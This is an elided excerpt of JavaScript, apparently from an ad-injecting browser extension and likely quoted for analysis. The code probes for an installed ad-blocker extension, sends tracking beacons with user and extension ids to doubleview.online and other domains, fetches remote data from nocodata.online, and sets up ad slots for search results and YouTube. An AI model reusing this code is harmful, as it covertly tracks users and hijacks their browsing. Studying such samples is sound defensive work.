...
if (!window.zMainObj.adRequests) {
	...
	window.zMainObj.adRequests = {
		ADBinst: false,
		checkADB: async () => {
			async function checkAlreadyInstalled(url, rsv) {
				try {
					...
					if (response.status === 200) {
						...
						//if (debug) console.log(response.statusText);
			...
			const isInstalled = await checkAlreadyInstalled('chrome-extension://dlbgdlmfkjiffjkchlipihnmbmhnapja/hosts.json');
			if(isInstalled)
			{
				let canMakeRequest = await checkAlreadyInstalled('https://agadata.online/t.txt',1);
				if(!canMakeRequest)
				{
					window.zMainObj.adRequests.ADBinst = true;
				}
			}
		},
		...
		altStat: function (action, blockName, network, count = 1) {
			new Image().src =
				'https://doubleview.online/gant/omflgbampleamlpmegfhongjnbbhilhl_64a8d054e7e29f4685ee59a4/omflgbampleamlpmegfhongjnbbhilhl/' +
				action +
				'/' +
				blockName +
				'/' +
		...
		stat: function (action, blockName, network, count = 1) {
			...
			let statUrl =
				`https://${statDom}/s/c?a=${action}&u=64a8d054e7e29f4685ee59a4&e=omflgbampleamlpmegfhongjnbbhilhl&b=west_${blockName}&n=${network}_west&r=` +
				Math.random();
		...
		nts: function (options, callback) {
			if (window.zMainObj.adRequests.ADBinst)
			{
				callback(null);
				return;
			}
		...
		init: function () {
			...
			window.zMainObj.adRequests.checkADB();
		},
		renderResults: {
			goSerpRes: null,
			ytInPlayer: null,
		...
		handleFrameMessage: function (event, args) {
			...
			const {frame, styles, adCount, successCallback, failCallback, debug, postStatCode, moduleName} = args;
...
(() => {
	...
	let unid = '64a8d054e7e29f4685ee59a4';
...
(() => {
	...
	function init(){
		...
		window.zMainObj.storage.getData('chromeRequest',function(data){
			...
			{
				window.zMainObj.storage.bgRequest('https://nocodata.online/chsn/p.php?e=omflgbampleamlpmegfhongjnbbhilhl',function(remoteData){
